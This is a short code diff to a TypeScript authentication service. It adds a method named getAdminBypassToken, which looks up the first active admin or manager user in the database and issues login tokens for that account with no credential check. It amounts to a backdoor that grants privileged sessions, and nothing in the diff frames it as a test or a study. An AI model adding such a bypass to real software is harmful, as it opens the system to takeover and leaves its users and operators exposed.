@@ -38,6 +38,15 @@ export class AuthService {
     return this.generateTokens(user);
   }
 
+  async getAdminBypassToken() {
+    const admin = await this.prisma.user.findFirst({
+      where: { role: { in: ['ORG_ADMIN', 'SUPER_ADMIN', 'MANAGER'] }, isActive: true },
+      include: { organization: true, building: true },
+    });
+    if (!admin) return null;
+    return this.generateTokens(admin);
+  }
+
   async getDefaultOrg() {
     const org = await this.prisma.organization.findFirst({ orderBy: { createdAt: 'asc' } });
     return org ? { orgId: org.id, orgName: org.name } : null;
